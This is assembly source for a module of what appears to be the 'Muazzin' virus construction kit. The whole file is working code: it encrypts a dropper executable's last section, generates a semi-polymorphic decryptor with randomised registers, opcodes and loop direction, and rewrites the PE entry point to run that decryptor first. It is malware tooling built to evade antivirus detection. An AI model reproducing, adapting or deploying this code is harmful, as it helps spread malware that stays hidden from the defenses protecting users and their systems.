;Muazzin para encriptar dropper, semi-poly

BITS 32

%include "\muazzin\muazzin.asi"
%include "pe.inc"

TYPE    EQU "encr"
VERSION EQU 0202h

entry:
       mov esi, [esp+4]                 ;esi==muazzin_struc
       test dword [esi+m_why], MT_PROCESSDROPPER
       jnz dropper
       test dword [esi+m_why], MT_QUERY
       jz .exit
       mov esi, MT_QUERY+MT_PROCESSDROPPER
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
  .exit:
       ret 4

dropper:
       pushad

       call .kernel32
       db "KERNEL32.DLL",0
  .kernel32:
       call [esi+GMH]
       call .gettick
       db "GetTickCount",0
  .gettick:
       push eax
       call [esi+GPA]
       call .tmp
  .tmp:
       pop ebp
       call eax
       mov [(ebp-.tmp)+random.seed], eax

       mov ebp, [esi+m_dropper]
       mov esi, ebp
       add esi, [esi+03ch]
       add esi, 0f8h
       mov edi, [esi+SECTION_HEADER.PointerToRawData]
       mov ecx, [esi+SECTION_HEADER.SizeOfRawData]
       mov eax, [esi+SECTION_HEADER.PointerToRawData+40]
       sub eax, edi
       sub eax, ecx
       sub eax, (.over-.init)+10h
       jc near .done                         ;enought space?
       add ecx, 3
       shr ecx, 2               ;byte->dword
       add edi, ebp
       call .over

  .init:
       push dword 12345678h               ;reg 1
       pop eax
  .pointer:
       mov edi, 00401000h               ;reg 2
  .key:
       mov ebx, 12345678h               ;reg 3
  .decr:
       sub [edi], ebx             ;reg 2 3
  .key_fuck:
       add ebx, 12345678h               ;reg 3
  .point:
       add edi, byte 4                  ;reg 2
  .counter:
       dec eax                          ;reg 1
       jnz .decr
       db 0e9h
       dd 12345678h

  .over:
       pop edx
       mov [edx+1], ecx         ;size
       call random
       mov ebx, eax
       call random
       mov [edx+((.decr-.init)-4)], eax         ;key
       mov [edx+((.point-.init)-4)], ebx         ;key changer
       call poly                ;mutate decryptor!
       push edi
       add edi, dword 0
       nop
  .encr:
       add [edi], eax
  .encr_changekey:
       add eax, ebx
       add edi, byte 4
  .direction equ $-1
       loop .encr
  .pop:
       nop
       mov ebx, edi
       sub ebx, [esi+SECTION_HEADER.PointerToRawData]
       add ebx, [esi+SECTION_HEADER.VirtualAddress]
       sub ebx, ebp                          ;set new entry
       mov eax, ebx
       xchg ebx, [esi-0f8h+PE_HEADER.AddressOfEntryPoint]
       sub ebx, eax
       sub ebx, .over-.init
       mov [edx+(.over-.init)-4], ebx
       xchg edx, esi
       mov ecx, (.over-.init)           ;zopy decryptor
       rep movsb
       pop esi
       sub edi, esi             ;calc new size
       mov [edx+SECTION_HEADER.SizeOfRawData], edi
  .done:
       popad
       mov dword [esi+m_result], MR_OK
       ret 4

random:
       push ecx
       push edx
       xor eax, 12345678h
  .seed equ $-4
       sub edx, edx
       mov ecx, 8
  .shuffle:
       add eax, eax
       jnc .skip
       mul ecx
       xor eax, edx
  .skip:
       ror eax, cl
       loop .shuffle
       call .tmp
  .tmp:
       pop ecx
       add [(ecx-.tmp)+.seed], eax
       pop edx
       pop ecx
       ret

poly:
       pushad
  .again0:
       call random
       and eax, 07h
       cmp al, 4        ;no ESP
       je .again0
       mov ebx, eax
  .again:
       call random
       and eax, 0707h
       cmp al, 4        ;no ESP
       je .again
       cmp ah, 4        ;no ESP
       je .again
       cmp al, ah       ;no same reg
       je .again
       cmp al, bl
       je .again
       cmp ah, bl
       je .again
       cmp ah, 5
       jne .skip
       xchg al, ah      ;EBP cant be pointer
  .skip:
       ;ah=pointer al=counter bl=key
       and byte [edx+5], 011111000b
       and byte [edx+(dropper.counter-dropper.init)], 011111000b
       or [edx+5], al            ;set new counter
       or [edx+(dropper.counter-dropper.init)], al
       and byte [edx+(dropper.pointer-dropper.init)], 011111000b
       and byte [edx+(dropper.point-dropper.init)+1], 011111000b
       and byte [edx+(dropper.decr-dropper.init)+1], 011000000b
       or [edx+(dropper.pointer-dropper.init)], ah
       or [edx+(dropper.point-dropper.init)+1], ah
       or [edx+(dropper.decr-dropper.init)+1], ah       ;set new pointer
       and byte [edx+(dropper.key-dropper.init)], 011111000b
       and byte [edx+(dropper.key_fuck-dropper.init)+1], 011111000b
;       and byte [edx+(dropper.decr-dropper.init)+1], 011000111b
       or [edx+(dropper.key-dropper.init)], bl
       or [edx+(dropper.key_fuck-dropper.init)+1], bl
       shl bl, 3
       or [edx+(dropper.decr-dropper.init)+1], bl
       call random
       mov ebp, eax
       bt ebp, 0
       jnc .no_pointer_change
       xor byte [edx+(dropper.point-dropper.init)+1], 28h ;0c0h xor 0e8h
       neg byte [edx+(dropper.point-dropper.init)+2]
  .no_pointer_change:
       mov eax, 01292901h
       bt ebp, 1
       jnc .add_sub
       ror eax, 16
  .add_sub:
       bt ebp, 2
       jnc .no_xor
       mov ax, 3131h
  .no_xor:
       mov byte [edx+(dropper.decr-dropper.init)], al
       mov byte [edx+(dropper.encr-dropper.init)], ah
       mov eax, 0e829c001h
       bt ebp, 3
       jnc .no_add_sub
       ror eax, 16
  .no_add_sub:
       bt ebp, 4
       jnc .xor
       mov ax, 0f031h
  .xor:
       and byte [edx+(dropper.key_fuck-dropper.init)+1], 0111b
       or byte [edx+(dropper.key_fuck-dropper.init)+1], ah
       mov byte [edx+(dropper.encr_changekey-dropper.init)], al
       test ebx, ebx
       jnz .no_optimize
       mov al, 35h
       cmp ah, 0f0h
       je .is_it
       mov al, 05h
       cmp ah, 0c0h
       je .is_it
       mov al, 2dh
  .is_it:
       mov ebx, 90909090h
       mov byte [edx+(dropper.key_fuck-dropper.init)], bl
       xchg ebx, [edx+(dropper.key_fuck-dropper.init)+2]
       push byte 0
       pop ecx
       bt ebp, 5
       jnc .nop_last
       inc ecx
  .nop_last:
       mov byte [edx+ecx+(dropper.key_fuck-dropper.init)], al
       mov [edx+ecx+(dropper.key_fuck-dropper.init)+1], ebx
  .no_optimize:
       bt ebp, 6
       jnc .invert_direction
       mov eax, [edx+(dropper.init-dropper.init)+1]
       shl eax, 2
       mov [edx+(dropper.encr-dropper.init)-5], eax
       add [edx+(dropper.pointer-dropper.init)+1], eax
       neg byte [edx+(dropper.direction-dropper.init)]
       neg byte [edx+(dropper.point-dropper.init)+2]
       mov byte [edx+(dropper.encr-dropper.init)-1], 50h+7
       mov byte [edx+(dropper.pop-dropper.init)], 58h+7
  .invert_direction:
       cmp byte [edx+(dropper.counter-dropper.init)], 48h+1
       jne .no_loop
       bt ebp, 7
       jnc .no_loop
       mov byte [edx+(dropper.counter-dropper.init)+1], 0e2h
       mov byte [edx+(dropper.counter-dropper.init)], 090h
       bt ebp, 8
       jnc .no_loop
       mov ax, word [edx+(dropper.counter-dropper.init)+1]
       inc ah
       mov word [edx+(dropper.counter-dropper.init)], ax
       mov byte [edx+(dropper.counter-dropper.init)+2], 090h
  .no_loop:
       popad
       ret
